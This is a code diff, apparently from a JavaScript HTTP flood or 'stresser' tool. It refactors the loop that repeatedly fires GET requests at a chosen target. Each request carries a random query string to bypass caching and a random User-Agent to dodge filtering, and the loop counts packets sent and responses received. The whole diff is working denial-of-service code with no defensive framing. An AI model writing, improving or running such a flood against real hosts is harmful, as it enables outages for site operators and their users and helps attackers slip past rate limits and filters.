@@ -152,22 +152,26 @@ const run = async () => {
   intervals.set(
     'STRESSING',
     setInterval(() => {
-      for (let i = 0; i < throttling; i++) {
-        packets_sent++;
+      void (async () => {
+        for (let i = 0; i < throttling; i++) {
+          packets_sent++;
 
-        fetch(`http://${target}?${Math.random().toString()}=${Math.random().toString()}`, {
-          method: 'GET',
-          headers: {
-            'User-Agent': RandomUA.getRandom()
-          }
-        })
-          .then((response) => {
+          try {
+            const response = await fetch(`http://${target}?${Math.random().toString()}=${Math.random().toString()}`, {
+              method: 'GET',
+              headers: {
+                'User-Agent': RandomUA.getRandom()
+              }
+            });
+
             if ((response.status >= 200 && response.status < 300) || (response.status >= 400 && response.status < 500)) {
               successful_responses++;
             } else unsuccessful_responses++;
-          })
-          .catch(() => unsuccessful_responses++);
-      }
+          } catch {
+            unsuccessful_responses++;
+          }
+        }
+      })();
     })
   );
 
